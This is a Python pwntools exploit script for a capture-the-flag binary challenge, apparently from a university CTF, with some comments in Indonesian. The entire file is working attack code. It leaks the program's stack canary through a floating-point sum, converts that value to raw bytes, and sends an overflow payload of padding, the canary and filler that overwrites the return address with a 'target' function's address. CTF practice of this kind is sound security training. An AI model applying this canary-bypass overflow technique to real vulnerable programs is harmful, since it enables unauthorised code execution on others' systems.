from pwn import *
import struct

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 9999
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *main+201
        b *main+237
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')

target_address = p64(e.symbols["target"])
dummy = b'A' * 10
payload = b'8'  # mulai dari 0x40 waktu n = 1, cari perkalian 8 sampe 0x10
p.sendline(payload)
print(p.recv())
for i in range(8):
    p.sendline(b'-')
sleep(1)
canary_weird = p.recvline().decode().split(" ")[-1].strip()
print(f"Got sum of canary: {canary_weird}")
float_value = float.fromhex(canary_weird)
bytes_value = struct.pack('d', float_value)
print(f"Converted to bytes: {bytes_value}")
print(p.recv())
payload = dummy + bytes_value + b'A' * 8 + target_address
p.sendline(payload)

print(p.recv())
if LOCAL:
    pause()
